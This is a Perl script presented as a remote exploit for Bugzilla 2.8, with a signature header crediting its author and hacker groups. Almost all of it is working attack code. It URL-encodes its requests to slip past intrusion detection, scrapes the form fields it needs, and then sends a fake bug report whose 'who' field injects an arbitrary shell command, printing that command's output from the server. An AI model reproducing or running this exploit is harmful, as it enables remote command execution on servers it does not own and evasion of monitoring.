#!/usr/bin/perl

# Bugzilla 2.8 remote exploit
# by {} - karin@root66.nl.eu.org
# 	RooT66		- http://root66.nl.eu.org
# 	ShellOracle	- http://www.shelloracle.cjb.net
# 	b0f		- http://b0f.freebsd.lublin.pl
# 	
# This exploits uses antiIDS tricks ripped from whisker

# next 2 functinos stolen from whisker, commented by me
sub rstr { # no, this is not a cryptographically-robust number generator
        my $str,$c;
        $drift=(rand() * 10) % 10;
        for($c=0;$c<10+$drift;$c++){
        $str .= chr(((rand() * 26) % 26) + 97);} # yes, we only use a-z
        return $str;}

sub antiIDS {
	($url) = (@_);
        $url =~s/([-a-zA-Z0-9.\<\>\\\|\'\`])/sprintf("%%%x",ord($1))/ge;
	$url =~ s/\ /+/g;
        $url =~s/\//\/.\//g;
	return $url;
}
#end of stolen stuff

($complete_url, $Bugzilla_login, $Bugzilla_password, $command) = (@ARGV);         

print("Exploit for Bugzilla up to version 2.8\n");
print("        by {} - karin\@root66.nl.eu.org\n");
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
print("RooT66		- http://root66.nl.eu.org\n");
print("ShellOracle	- http://www.shelloracle.cjb.net\n");
print("b0f		- http://b0f.freebsd.lublin.pl\n");
print("\n");

if ($complete_url eq "-h" || $complete_url eq "--help") {
	print("Usage: $0 url emailaddress password command\n");
	exit;
}

# Get information of user
if (!$complete_url) {
	print("URL: ");
	$complete_url = <STDIN>; chomp($complete_url); $complete_url =~ s/http:\/\///;
}
if (!$Bugzilla_login) {
	print("EMAIL: ");
	$Bugzilla_login = <STDIN>; chomp($Bugzilla_login);
}
if (!$Bugzilla_password) {
	print("PASSWORD: ");
	$Bugzilla_password = <STDIN>; chomp($Bugzilla_password);
}
if (!$command) {
	print("COMMAND: ");
	$command = <STDIN>; chomp($command);
}


# Set some variables
$host = $complete_url; $host =~ s/\/.*//;
$base_dir = $complete_url; $base_dir =~ s/^$host//; $base_dir =~ s/[a-zA-Z.]*$//;

# Make own directory
system("mkdir $$");

print("Getting information needed to submit our 'bug'\n");
# Get product name
system("cd $$; lynx -source \"http://$host/" . antiIDS("$base_dir/enter_bug.cgi") .  "?Bugzilla_login=" . antiIDS("$Bugzilla_login") . "&Bugzilla_password=" . antiIDS("$Bugzilla_password") . "\" > enter_bug.cgi");
open(FILE, "< $$/enter_bug.cgi");
while($input = <FILE>) {
	if ($input =~ /enter_bug.cgi\?product=/) {
		chomp($input);
		$product = $input;
		$product =~ s/.*product=//;
		$product =~ s/".*//;
		if ($product =~ /\&component=/) {
			$component = $product;
			$product =~ s/&.*//;		# strip component
			$component =~ s/.*component=//;
			$component =~ s/".*//;
		}
	}
}
print("\tProduct: $product\n");
if ($component) {
	print("\tComponent: $component\n");
	}
# Get more information
$page = antiIDS("$base_dir/enter_bug.cgi?") . "product=" . antiIDS("$product") . "&Bugzilla_login=" . antiIDS("$Bugzilla_login") . "&Bugzilla_password=" . antiIDS("$Bugzilla_password");
system("cd $$; lynx -dump \"http://$host/$page\" > enter_bug.cgi");
open(FILE, "< $$/enter_bug.cgi");
while($input = <FILE>) {
	chomp($input);
	if ($input =~ /Reporter:/) {
		$reporter = $input;
		$reporter =~ s/.*Reporter: //;
		$reporter =~ s/\ .*//;
	}
	if ($input =~ /Version:/) {
		$version = $input;
		$version =~ s/.*Version: \[//;
		$version =~ s/\.*\].*//;
	}
	if ($input =~ /Component:/) {
		$component = $input;
		$component =~ s/.*Component: \[//;
		$component =~ s/\.*\].*//;
	}
	if ($input =~ /Platform:/) {
		$platform = $input;
		$platform =~ s/.*Platform: \[//;
		$platform =~ s/\.*\].*//;
	}
	if ($input =~ /OS:/) {
		$os = $input;
		$os =~ s/.*OS: \[//;
		$os =~ s/\.*\].*//;
	}
	if ($input =~ /Priority:/) {
		$priority = $input;
		$priority =~ s/.*Priority: \[//;
		$priority =~ s/\].*//;
	}
	if ($input =~ /Severity:/) {
		$severity = $input;
		$severity =~ s/.*Severity: \[//;
		$severity =~ s/\.*\].*//;
	}
}
print("\tReporter: $reporter\n");
print("\tVersion: $version\n");
print("\tComponent: $component\n");
print("\tPlatform: $platform\n");
print("\tOS: $os\n");
print("\tPriority: $priority\n");
print("\tSeverity: $severity\n");
close(FILE);


#liftoff
print("Sending evil bug report\n");
$page = antiIDS("$base_dir/process_bug.cgi") .  "?bug_status=" . antiIDS("NEW") . "&reporter=" . antiIDS($reporter) . "&product=" . antiIDS("$product") . "&version=" . antiIDS("$version") . "&component=" . antiIDS("$component") . "&rep_platform=" . antiIDS("$platform") . "&op_sys=" . antiIDS($os) . "&priority=" . antiIDS($priority) . "&bug_severity=" . antiIDS($severity) . "&who=". antiIDS("blaat\@blaat.com;echo \\<pre\\>START OUTPUT COMMAND;$command;echo \\<\\/pre\\>END OUTPUT COMMAND;") . "&knob=" . antiIDS("duplicate") . "&dup_id=" . antiIDS("202021234123412341234") . "&Bugzilla_login=" . antiIDS($Bugzilla_login) . "&Bugzilla_password=" . antiIDS($Bugzilla_password) . "&assigned_to=&cc=&bug_file_loc=&short_desc=&comment=&form_name=enter_bug";
system("cd $$; lynx -dump \"$host/$page\" > enter_bug.cgi");	
open(FILE, "< $$/enter_bug.cgi");
while($input = <FILE>) {
	chomp($input);
	if ($input =~ /END OUTPUT COMMAND/) {
		$startoutput = 0;
	}
	if ($startoutput) {
		print("$input\n");
	}
	if ($input =~ /START OUTPUT COMMAND/) {
	$startoutput = 1;
	}
}
close(FILE);
# Delete shit
# system("rm -rf $$");

